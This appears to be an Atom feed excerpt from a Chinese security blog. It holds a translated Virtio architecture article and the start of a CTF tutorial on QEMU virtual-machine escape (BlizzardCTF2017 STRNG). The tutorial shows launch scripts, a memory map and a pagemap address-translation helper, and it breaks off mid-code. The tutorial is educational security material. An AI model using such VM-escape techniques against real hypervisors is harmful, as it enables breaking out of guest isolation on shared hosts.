&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt;! /bin/sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./qemu-system-x86_64 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-initrd ./rootfs.cpio \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-kernel ./vmlinuz-4.8.0-52-generic \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-append &amp;#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;#x27; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-enable-kvm \     # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-monitor /dev/null \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-m 64M --nographic  -L ./dependency/usr/local/share/qemu \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-L pc-bios \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-device hitb,id=vda&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到&lt;code&gt;HitbState&lt;/code&gt;结构体，其中还包含&lt;code&gt;dma_state&lt;/code&gt;结构体。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="qemu" scheme="http://hhdx.xyz/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>【翻译】Virtio：一种Linux I/O虚拟化框架</title>
    <link href="http://hhdx.xyz/2020/11/27/Virtio-intro/"/>
    <id>http://hhdx.xyz/2020/11/27/Virtio-intro/</id>
    <published>2020-11-27T06:43:05.000Z</published>
    <updated>2020-12-05T11:53:44.490Z</updated>
    
    <content type="html"><![CDATA[<p>首发于安全客<a href="https://www.anquanke.com/post/id/224001">Virtio：一种Linux I/O虚拟化框架 - 安全客，安全资讯平台 (anquanke.com)</a></p><p>原文：<a href="https://developer.ibm.com/articles/l-virtio/">Virtio: An I/O virtualization framework for Linux – IBM Developer</a></p><blockquote><p>学习Virtio推荐首先看一篇，国内好多文章写的太乱了，看来看不去都不明白整体的架构，给人很模糊的感觉。这篇文章好很多。</p><p><strong>受限于个人水平，翻译肯定有不妥之处，译注根据自己的理解加入，也不一定准确。如有错误，还请不吝指出。</strong></p></blockquote><p>简言之，<code>virtio</code>是设备和半虚拟化管理程序(paravirtualized hypervisor)之间的一个抽象层。<code>virtio</code>是Rusty Russell为了支持他自己的虚拟化方案<code>lguest</code>而开发的。这篇文章以对半虚拟化和设备仿真的介绍开始，然后探寻<code>virtio</code>中的一些细节。采用kernel 2.6.30版本的<code>virtio</code>框架进行讲解。</p><p>Linux是hypervisor的“游乐场”。正如我在文章<a href="https://developer.ibm.com/tutorials/l-hypervisor/">使用Linux作为hypervisor</a>中所展现的，Linux提供了许多具有不同特性和优势的虚拟化解决方案。例如KVM(Kernel-based Virtual Machine)，<code>lguest</code>、和用户态的Linux。在Linux使用这些虚拟化解决方案给操作系统造成了重担，因为它们各自都有独立的需求。其中一个问题就是设备的虚拟化。<code>virtio</code>为各种各样设备（如：网络设备、块设备等等）的虚拟提供了通用的标准化前端接口，增加了各个虚拟化平台的代码复用。而不是各自为政般的使用繁杂的设备虚拟机制。</p><h2 id="全虚拟化-vs-半虚拟化"><a href="#全虚拟化-vs-半虚拟化" class="headerlink" title="全虚拟化 vs. 半虚拟化"></a>全虚拟化 vs. 半虚拟化</h2><p>我们先来讨论两种完全不同的虚拟化方案：全虚拟化和半虚拟化。在全虚拟化中，客户操作系统在hypervisor上运行，相当于运行于裸机一般。客户机不知道它在虚拟机还是物理机中运行，不需要修改操作系统就可以直接运行。与此相反的是，在半虚拟化中，客户机操作系统不仅能够知道其运行于虚拟机之上，也必须包含与hypervisor进行交互的代码。但是能够在客户机和hypervisor的切换中，带来更高的效率（图1）。</p><p><em>译注：客户机与hypervisor的切换举例：客户机请求I/O，需要hypervisor中所虚拟的设备来响应请求，此时就会发生切换。</em></p><p>在全虚拟化中，hypervisor必须仿真设备硬件，也就是说模仿硬件最底层的会话（如：网卡驱动）。尽管这种仿真看起来方便，但代价是极低的效率和高度的复杂性。在半虚拟化中，客户机与hypervisor可以共同合作让这种仿真具有更高的效率。半虚拟化不足就是客户机操作系统会意识到它运行于虚拟机之中，而且需要对客户机操作系统做出一定的修改。</p><a id="more"></a><p><strong>图1. 全虚拟化和半虚拟化中的设备仿真</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgfigure1.jpg" alt="figure1"></p><p>硬件也随着虚拟化不断地发展着。新处理器加入了高级指令，使客户机操作系统和hypervisor的切换更加高效。硬件也随着I/O虚拟化不断地发生改变（参照Resource了解PCI passthrough和单/多根I/O虚拟化）。</p><p>在传统的全虚拟化环境中，hypervisor必须陷入(trap)请求，然后模仿真实硬件的行为。尽管这样提供了很大的灵活性（指可以运行不必修改的操作系统），但却造成了低效率（图1左侧）。图1右侧展示了半虚拟化。客户机操作系统知道运行于虚拟机之中，加入了驱动作为前端。hypervisor为特定设备仿真实现了后端驱动。这里的前端后端就是<code>virtio</code>的构件，提供了标准化接口，提高了设备仿真开发的代码复用程度和仿真设备运行的效率。</p><p><em>作者注：<code>virtio</code>并不是半虚拟化领域的唯一存在。Xen提供了半虚拟化的设备驱动，VMware也提供了名为<code>Guest Tools</code>的半虚拟化支持。</em></p><h2 id="Linux客户机中的一种抽象"><a href="#Linux客户机中的一种抽象" class="headerlink" title="Linux客户机中的一种抽象"></a>Linux客户机中的一种抽象</h2><p>如前节所述，<code>virtio</code>为半虚拟化提供了一系列通用设备仿真的接口。这种设计允许hypervisor导出一套通用的设备仿真操作，只要使用这一套接口就能够工作。图2解释了为什么这很重要。通过半虚拟化，客户机实现了通用的接口，同时虚拟化管理程序提供设备仿真的后端驱动。后端驱动并不一定要一致，只要它实现了前端所需的各种操作就可以。</p><p><strong>图2. 使用virtio的驱动抽象</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgfigure2.jpg" alt="figure2"></p><p>注意在实际中，使用用户空间的QEMU程序来进行设备仿真，所以后端驱动通过QEMU的I/O来与用户空间的hypervisor通信。QEMU是系统模拟器，包括提供客户机操作系统虚拟化平台，提供整个系统的仿真（PCI host controller, disk, network, video hardware, USB controller等）。</p><p><code>virtio</code>依靠于简单的缓存管理，用来存储客户机的命令与客户机所需的数据。我们继续来看<code>virtio</code>的API及其构件。</p><h2 id="Virtio-架构"><a href="#Virtio-架构" class="headerlink" title="Virtio 架构"></a>Virtio 架构</h2><p>除了前端驱动（在客户机操作系统中实现）和后端驱动（在hypervisor中实现）之外，<code>virtio</code>还定义了两层来支持客户机与hypervisor进行通讯。虚拟队列(Virtual Queue)接口将前端驱动和后端驱动结合在一起。驱动可以有0个或多个队列，依赖于它们的需要。例如，<code>virtio</code>网络驱动使用了两个虚拟队列（一个用于接收一个用于发送），而<code>virtio</code>块设备驱动只需要一个。虚拟队列，通常使用环形缓冲，在客户机与虚拟机管理器之间传输。可以使用任意方式实现，只要客户机与虚拟机管理器相统一。</p><p><strong>图3. virtio框架的架构</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgfigure3.jpg" alt="figure3"></p><p>如图3，包含了五种前端驱动：块设备（如硬盘）、网络设备、PCI仿真、balloon驱动（用于动态的管理客户机内存使用）和一个终端驱动。每一个前端驱动，在hypervisor中都有一个相匹配的后端驱动。</p><h2 id="概念层级"><a href="#概念层级" class="headerlink" title="概念层级"></a>概念层级</h2><p>在客户机的视角来看，对象层级如图4所示。顶端是<code>virtio_driver</code>，表示客户机中的前端驱动。与驱动相匹配的设备被封装在<code>virtio_device</code>（在客户机中表示设备），其中有成员<code>config</code>指向<code>virtio_config_ops</code>结构（其中定义了配置<code>virtio</code>设备的操作）。<code>virtqueue</code>中有成员<code>vdev</code>指向<code>virtio_device</code>（也就是指向它所服务的某一设备<code>virtio_device</code>）。最下面，每个<code>virtio_queue</code>中有个类型为<code>virtqueue_ops</code>的对象，其中定义了与hypervisor交互的虚拟队列操作。</p><p><strong>图4. virtio前端的对象层级</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgfigure4.jpg" alt="figure4"></p><p>这一过程起始于<code>virtio_driver</code>的创建和后续的使用<code>register_virtio_driver</code>将驱动进行注册。<code>virtio_driver</code>结构定义了设备驱动的上层结构，包含了它所支持的设备的设备ID，特性表（根据设备的类型有所不同），和一系列回调函数。当hypervisor发现新设备，并且匹配到了设备ID，就会以<code>virtio_device</code>为参数调用<code>probe</code>函数（于<code>virtio_driver</code>中提供）。这一结构与管理数据一起被缓存（以独立于驱动的方式）。根据设备的类型，<code>virtio_config_ops</code>中的可能会被调用，以获取或设置设备相关的选项（例如，获取硬盘块设备的读/写状态或者设置块设备的块大小）。</p><p>注意，<code>virtio_device</code>中没有包含指向所对应<code>virtqueue</code>的成员（<code>virtqueue</code>有指向<code>virtio_device</code>的成员）。为了得到与<code>virtio_device</code>相关联的<code>virtqueue</code>，需要使用<code>virtio_config_ops</code>结构中的<code>find_vq</code>函数。这个函数返回与该<code>virtqueue</code>相关联的设备实例。<code>find_vq</code>还允许为<code>virtqueue</code>指定回调函数，用于在hypervisor准备好数据时，通知客户机。</p><p><code>virtqueue</code>结构包含可选的回调函数（用于在hypervisor填充缓冲后，通知客户机）、一个指向<code>virtio_device</code>、一个指向<code>virtqueue</code>操作和一个特别的<code>priv</code>用于底层实现使用。<code>callback</code>是可选的，也可以动态的启用或禁用。</p><p>这个层级的核心是<code>virtqueue_ops</code>，其中定义了如何在客户机和hypervisor之间传输命令与数据。我们先来探索<code>virtqueue</code>中对象的添加和删除操作。</p><h2 id="Virtio缓冲"><a href="#Virtio缓冲" class="headerlink" title="Virtio缓冲"></a>Virtio缓冲</h2><p>客户机驱动（前端）与hypervisor（后端）通过缓冲区进行通信。对于一次I/O，客户机提供一个或多个缓冲区表示请求。例如，你可以使用三个缓冲区，其中一个用来存储读请求，其他两个用来存储回复数据。内部这个配置被表示为分散/聚集(scatter-gather)列表（列表中的每个元素存储有缓冲区地址与长度）。</p><h2 id="核心API"><a href="#核心API" class="headerlink" title="核心API"></a>核心API</h2><p>将客户机驱动与hypervisor驱动链接起来，偶尔是通过<code>virtio_device</code>，大多数情况下都是通过<code>virtqueue</code>。<code>virtqueue</code>支持五个API函数。使用第一个函数<code>add_buf</code>向hypervisor添加请求，这种请求以分散/聚集列表的形式，正如先前讨论的。为了提交请求，客户机必须提供请求命令，分散/聚集列表（以缓冲区地址和长度为元素的数组），向外提供请求的缓冲区的数量（也就是发送请求信息给hypervisor），向内传递数据的缓冲区的数量（hypervisor用来填充数据，返回给客户机）。当客户机通过<code>add_buf</code>向hypervisor提交一条请求后，客户机就可以使用<code>kick</code>通知hypervisor新请求已递送。但为了更好地性能，客户机应该在<code>kick</code>通知hypervisor之前，提交尽可能多的请求。</p><p>客户机使用<code>get_buf</code>接收从hypervisor中返回的数据。客户机可以简单地使用<code>get_buf</code>轮询或者等待由<code>virtqueue callback</code>函数的通知。当客户机知道了缓冲区数据可用，就会使用<code>get_buf</code>获取数据。</p><p>最后两个<code>virtqueue</code>的API是<code>enable_cb</code>和<code>disable_cb</code>，可用使用这两个函数启用和禁用回调函数（<code>callback</code>函数使用<code>find_vq</code>初始化设置）。注意回调函数与hypervisor在不同的地址空间，所以调用需要间接调用(indirect hypervisor call)（例如：<code>kvm_hypercall</code>）。</p><p>缓冲区的格式、顺序与内容支队前端和后端驱动有意义。内部传送（现在使用环形缓冲区实现）只传输缓冲区，并不知道内部表达的意义。</p><h2 id="Virtio驱动例子"><a href="#Virtio驱动例子" class="headerlink" title="Virtio驱动例子"></a>Virtio驱动例子</h2><p>对于各种各样前端驱动，可以在Linux内核源码的<code>./drivers</code>子目录下找到。<code>virtio</code>网络驱动在<code>./driver/net/virtio_net.c</code>，<code>virtio</code>块驱动在<code>./driver/block/virtio_blk.c</code>。<code>./driver/virtio</code>子目录下提供了<code>virtio</code>接口的实现(<code>virtio</code>设备、驱动、<code>virtqueue</code>和环形缓冲区)。<code>virtio</code>也被用在了高性能计算(High-Performance Computing, HPC)研究之中，使用共享内存传递内部虚拟机的信息。特别的，这使用了<code>virtio</code>来实现虚拟化PCI接口。可以再resources中找到相关工作。</p><p>你可以在Linux内核中练习半虚拟化基础工作。你所需要的就是一个作为hypervisor的内核，客户机内核和用来仿真设备的QEMU。你可以使用KVM(一个存在于宿主机内核中的模块)或者Rusty Russell的lguest（一个修改过的Linux内核）。两种方案都支持<code>virtio</code>（配合以QEMU进行系统模拟和<code>libvirt</code>进行虚拟化管理）。</p><p>Rusty的成果是简化了半虚拟化驱动的开发，并且设备仿真性能更高。最重要的还是，<code>virtio</code>能够提供更好地性能（两三倍的网络I/O）比现有的商业解决方案。虽说有一定的代价，但如果你的hypervisor和客户机系统是Linux，还是非常值得的。</p><h2 id="进一步"><a href="#进一步" class="headerlink" title="进一步"></a>进一步</h2><p>尽管你可以永远不会为<code>virtio</code>开发前端或者后端驱动，但它实现了一个有趣的架构，值得更加细致的理解它。与先前的Xen相比，<code>virtio</code>为了半虚拟化提高性能提供了新的可能。在作为投入使用的hypervisor和新虚拟技术的实验平台中，Linux不断地证明了它自己。<code>virtio</code>再一次证明了Linux作为hypervisor的优势和开放性。</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><p><a href="http://portal.acm.org/citation.cfm?id=1400097.1400108">Virtio: towards a de factor standard for virtual I/O devices</a></p></li><li><p><a href="https://www.ibm.com/developerworks/linux/library/l-hypervisor/index.html">Anatomy of a Linux hypervisor</a></p></li><li><p><a href="http://www.ibm.com/developerworks/linux/library/l-pci-passthrough/index.html">Linux virtualization and PCI passthrough</a></p></li><li><p><a href="http://blog.loftninjas.org/2008/10/22/kvm-virtio-network-performance/">performance advantage of virtio using KVM</a></p></li><li><p><a href="http://wiki.libvirt.org/page/Virtio">libvirt wiki</a></p></li><li><p><a href="http://lguest.ozlabs.org/">lguest</a></p></li><li><p><a href="http://www.linux-kvm.org/page/Main_Page">KVM</a></p></li><li><p><a href="http://www.springerlink.com/content/b1676363881h5662/">shared-memory message passing</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;首发于安全客&lt;a href=&quot;https://www.anquanke.com/post/id/224001&quot;&gt;Virtio：一种Linux I/O虚拟化框架 - 安全客，安全资讯平台 (anquanke.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原文：&lt;a href=&quot;https://developer.ibm.com/articles/l-virtio/&quot;&gt;Virtio: An I/O virtualization framework for Linux – IBM Developer&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;学习Virtio推荐首先看一篇，国内好多文章写的太乱了，看来看不去都不明白整体的架构，给人很模糊的感觉。这篇文章好很多。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;受限于个人水平，翻译肯定有不妥之处，译注根据自己的理解加入，也不一定准确。如有错误，还请不吝指出。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简言之，&lt;code&gt;virtio&lt;/code&gt;是设备和半虚拟化管理程序(paravirtualized hypervisor)之间的一个抽象层。&lt;code&gt;virtio&lt;/code&gt;是Rusty Russell为了支持他自己的虚拟化方案&lt;code&gt;lguest&lt;/code&gt;而开发的。这篇文章以对半虚拟化和设备仿真的介绍开始，然后探寻&lt;code&gt;virtio&lt;/code&gt;中的一些细节。采用kernel 2.6.30版本的&lt;code&gt;virtio&lt;/code&gt;框架进行讲解。&lt;/p&gt;
&lt;p&gt;Linux是hypervisor的“游乐场”。正如我在文章&lt;a href=&quot;https://developer.ibm.com/tutorials/l-hypervisor/&quot;&gt;使用Linux作为hypervisor&lt;/a&gt;中所展现的，Linux提供了许多具有不同特性和优势的虚拟化解决方案。例如KVM(Kernel-based Virtual Machine)，&lt;code&gt;lguest&lt;/code&gt;、和用户态的Linux。在Linux使用这些虚拟化解决方案给操作系统造成了重担，因为它们各自都有独立的需求。其中一个问题就是设备的虚拟化。&lt;code&gt;virtio&lt;/code&gt;为各种各样设备（如：网络设备、块设备等等）的虚拟提供了通用的标准化前端接口，增加了各个虚拟化平台的代码复用。而不是各自为政般的使用繁杂的设备虚拟机制。&lt;/p&gt;
&lt;h2 id=&quot;全虚拟化-vs-半虚拟化&quot;&gt;&lt;a href=&quot;#全虚拟化-vs-半虚拟化&quot; class=&quot;headerlink&quot; title=&quot;全虚拟化 vs. 半虚拟化&quot;&gt;&lt;/a&gt;全虚拟化 vs. 半虚拟化&lt;/h2&gt;&lt;p&gt;我们先来讨论两种完全不同的虚拟化方案：全虚拟化和半虚拟化。在全虚拟化中，客户操作系统在hypervisor上运行，相当于运行于裸机一般。客户机不知道它在虚拟机还是物理机中运行，不需要修改操作系统就可以直接运行。与此相反的是，在半虚拟化中，客户机操作系统不仅能够知道其运行于虚拟机之上，也必须包含与hypervisor进行交互的代码。但是能够在客户机和hypervisor的切换中，带来更高的效率（图1）。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;译注：客户机与hypervisor的切换举例：客户机请求I/O，需要hypervisor中所虚拟的设备来响应请求，此时就会发生切换。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;在全虚拟化中，hypervisor必须仿真设备硬件，也就是说模仿硬件最底层的会话（如：网卡驱动）。尽管这种仿真看起来方便，但代价是极低的效率和高度的复杂性。在半虚拟化中，客户机与hypervisor可以共同合作让这种仿真具有更高的效率。半虚拟化不足就是客户机操作系统会意识到它运行于虚拟机之中，而且需要对客户机操作系统做出一定的修改。&lt;/p&gt;</summary>
    
    
    
    
    <category term="qemu" scheme="http://hhdx.xyz/tags/qemu/"/>
    
    <category term="virtio" scheme="http://hhdx.xyz/tags/virtio/"/>
    
  </entry>
  
  <entry>
    <title>Qemu Escape ---- 以BlizzardCTF2017_STRNG为例</title>
    <link href="http://hhdx.xyz/2020/11/23/Qemu-Pwn/"/>
    <id>http://hhdx.xyz/2020/11/23/Qemu-Pwn/</id>
    <published>2020-11-23T07:05:17.000Z</published>
    <updated>2020-11-30T05:12:55.560Z</updated>
    
    <content type="html"><![CDATA[<p>最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。</p><p>本文主要参考raycp师傅的两篇文章。[1] [2]</p><h2 id="Qemu概述"><a href="#Qemu概述" class="headerlink" title="Qemu概述"></a>Qemu概述</h2><p>每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgqemu-architecture.png" alt="qemu-architecture"></p><p>qemu的内存结构，根据<a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html">QEMU Case Study</a>，虚拟机对应的内存结构为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                        Guest&#39; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#39;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><a id="more"></a><p>qemu虚拟机进程会使用mmap分配出对应大小的内存空间，作为虚拟机的物理内存。</p><p>以STRNG启动命令为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>其使用-m参数指定虚拟机内存大小为1G，启动虚拟机后查看其maps。(sudo gdb, 然后attach pid)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0x7fe71ab00000     0x7fe71ac00000 rw-p   100000 0      </span><br><span class="line">0x7fe71ac00000     0x7fe71bc00000 rw-p  1000000 0      </span><br><span class="line">0x7fe71bc00000     0x7fe71bc01000 ---p     1000 0      </span><br><span class="line">0x7fe71bcff000     0x7fe71bd00000 ---p     1000 0      </span><br><span class="line">0x7fe71bd00000     0x7fe71be00000 rw-p   100000 0      </span><br><span class="line">0x7fe71be00000     0x7fe75be00000 rw-p 40000000 0    # mmap  </span><br><span class="line">0x7fe75be00000     0x7fe75be01000 ---p     1000 0      </span><br><span class="line">0x7fe75beff000     0x7fe75bf00000 ---p     1000 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如何在qemu进程中找到虚拟机中分配的内存呢？</p><p>首先将qemu虚拟机中的虚拟地址转化为物理地址，这个物理地址就是mmap空间的偏移，使用mmap基址加上这个偏移，就是对应的qemu进程空间地址中地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    /proc/pid/pagemap</span></span><br><span class="line"><span class="comment">    * Bits 0-54  page frame number (PFN) if present</span></span><br><span class="line"><span class="comment">    * Bits 0-4   swap type if swapped</span></span><br><span class="line"><span class="comment">    * Bits 5-54  swap offset if swapped</span></span><br><span class="line"><span class="comment">    * Bit  55    pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</span></span><br><span class="line"><span class="comment">    * Bit  56    page exclusively mapped (since 4.2)</span></span><br><span class="line"><span class="comment">    * Bits 57-60 zero</span></span><br><span class="line"><span class="comment">    * Bit  61    page is file-page or shared-anon (since 3.5)</span></span><br><span class="line"><span class="comment">    * Bit  62    page swapped</span></span><br><span class="line"><span class="comment">    * Bit  63    page present</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);        <span class="comment">// page frame num，指的是右移12位后的页号</span></span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> 